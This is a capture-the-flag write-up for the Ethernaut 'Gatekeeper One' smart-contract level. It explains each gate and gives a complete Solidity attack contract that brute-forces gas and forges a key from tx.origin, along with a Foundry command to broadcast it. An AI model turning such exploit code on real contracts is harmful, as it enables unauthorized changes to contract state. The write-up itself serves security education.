---
title: GateKeeper One - The Ethernaut
published: 2025-09-21
description: GateKeeper One challenge writeup
tags: [blockchain, ethernaut]
category: CTF
image: "https://ethernaut.openzeppelin.com/imgs/BigLevel13.svg"
draft: false
---

> Cover image source: [Source](https://ethernaut.openzeppelin.com/imgs/BigLevel13.svg)

## Challenge Overview

Gatekeeper One is a three-gate challenge that prevents direct entry by ordinary externally-owned accounts.  
The goal is to become the contract's `entrant` by calling `enter(bytes8 _gateKey)` while satisfying three intentional checks (the "gates"):

1. `gateOne`: You must call through a contract (so `msg.sender != tx.origin`).  
2. `gateTwo`: Call must arrive with a very specific remaining-gas condition (`gasleft() % 8191 == 0`).  
3. `gateThree`: A bit-level constraint on the `bytes8 _gateKey` related to `tx.origin`.

This writeup shows how to craft the `gateKey`, why each gate exists, and how to brute-force the gas to pass `gateTwo`.

---

## Challenge Code

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract GatekeeperOne {
    address public entrant;

    modifier gateOne() {
        require(msg.sender != tx.origin);
        _;
    }

    modifier gateTwo() {
        require(gasleft() % 8191 == 0);
        _;
    }

    modifier gateThree(bytes8 _gateKey) {
        require(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)), "GatekeeperOne: invalid gateThree part one");
        require(uint32(uint64(_gateKey)) != uint64(_gateKey), "GatekeeperOne: invalid gateThree part two");
        require(uint32(uint64(_gateKey)) == uint16(uint160(tx.origin)), "GatekeeperOne: invalid gateThree part three");
        _;
    }

    function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
        entrant = tx.origin;
        return true;
    }
}
````

---

## Exploit Explanation

We need to satisfy all three gates in a single `enter()` call.

### Gate One: `require(msg.sender != tx.origin);`

This forces the caller to be a **contract**, not an EOA. You must deploy an attacker contract and **have that contract call** `enter(...)`. The contract's `msg.sender` will then be the attacker contract, while `tx.origin` remains your EOA.

### Gate Two: `require(gasleft() % 8191 == 0);`

This requires that, when the `enter()` function executes the `gateTwo` modifier, the *remaining gas* at that moment is a multiple of `8191`. Because different EVM instructions consume gas and the call-from-contract introduces additional overhead, the practical way to satisfy this is to call `enter()` from the attacker contract and **brute-force the supplied `gas`** for the internal `call{gas: x}()` until `gasleft() % 8191 == 0` inside the callee.

Important notes:

* The gas value passed to `.call{gas: g}()` is *the gas available to the callee*, but the EVM also deducts some gas before the callee reaches the `require`. So brute-forcing an offset across a range of nearby gas values (for example `base + i` for `i` in `0..8190`) is a practical approach.
* The required base offset depends on compiler version / opcode layout. A small search window of ~8191 tries is sufficient in practice.

### Gate Three: bit-level constraints on `_gateKey`

There are three checks; rewrite them in plain terms:

1. `uint32(uint64(_gateKey)) == uint16(uint64(_gateKey))`
   → The low 4 bytes (32 bits) of the key equals the low 2 bytes (16 bits). This means bits 16..31 of the low 32 bits must be zero.

2. `uint32(uint64(_gateKey)) != uint64(_gateKey)`
   → The low 32 bits are **not equal** to the full 64-bit value. So some of the high 32 bits (bits 32..63) must be non-zero.

3. `uint32(uint64(_gateKey)) == uint16(uint160(tx.origin))`
   → The low 32 bits (which must equal the low 16 bits per check 1) must equal the low 16 bits of the `tx.origin` address.

Combining these yields a simple construction:

* Let `k16 = uint16(uint160(tx.origin))` — that's the low 16 bits of your EOA address.
* The low 32 bits (`uint32`) of the key must equal `k16`. So bits 0..15 = `k16`, and bits 16..31 = `0`.
* The high 32 bits must be non-zero (to satisfy check 2).

A safe, minimal choice is:

```
key = bytes8( (uint64(1) << 32) | uint64(k16) )
```

This sets bit 32 (so high 32 bits ≠ 0) and sets the low 32 bits to `k16` (with bits 16..31 zero). That satisfies all three parts.

---

## Exploit Script

This attacker contract builds the key from `tx.origin` (the EOA that will call the attacker contract), then loops trying different gas values until the `enter()` call succeeds.

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "forge-std/console.sol";
import "../src/GatekeeperOne.sol";

contract Attack {
    GatekeeperOne public gatekeeperOneInstance;

    constructor(GatekeeperOne _gatekeeperOneInstance) {
        gatekeeperOneInstance = _gatekeeperOneInstance;
    }

    function attack() public {
        // key = uint64(_gateKey);

        // uint32(key) == uint16(uint160(tx.origin));
        // uint32(key) != key;        
        uint16 k16 = uint16(uint160(tx.origin));

        // uint32(key) == uint16(key);
        uint64 k64 = (uint64(1) << 63) + uint64(k16);
        bytes8 key = bytes8(k64);

        // bruteforce to pass gate two
        uint256 base = 20000;
        for (uint256 i = 0; i < 8191; i++) {
            uint256 gasToTry = base + i;
            (bool ok, ) = address(gatekeeperOneInstance).call{gas: gasToTry}(
                abi.encodeWithSelector(gatekeeperOneInstance.enter.selector, key)
            );
            if (ok) {
                return;
            }
        }
    }
}


contract GatekeeperOneSolution is Script {
    
     GatekeeperOne public gatekeeperOneInstance = GatekeeperOne(<YOUR_INSTANCE>);

    function run() public {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        Attack evil = new Attack(gatekeeperOneInstance);
        evil.attack();
        vm.stopBroadcast();
    }
}
```

> Tip: if `base = 20000` doesn't work in your environment, try other base offsets (e.g. `80000`, `100000`, etc.). The script loops over `8191` consecutive values per attempt; changing `base` shifts that window.

---

## Proof of Concept (PoC)

Run with Foundry (example):

```bash
forge script script/GatekeeperOneSolution.s.sol --rpc-url $SEPOLIA_URL --tc GatekeeperOneSolution --broadcast
```

After success, `entrant` on the `GatekeeperOne` instance will be set to your EOA (check with `gatekeeperOneInstance.entrant()`).

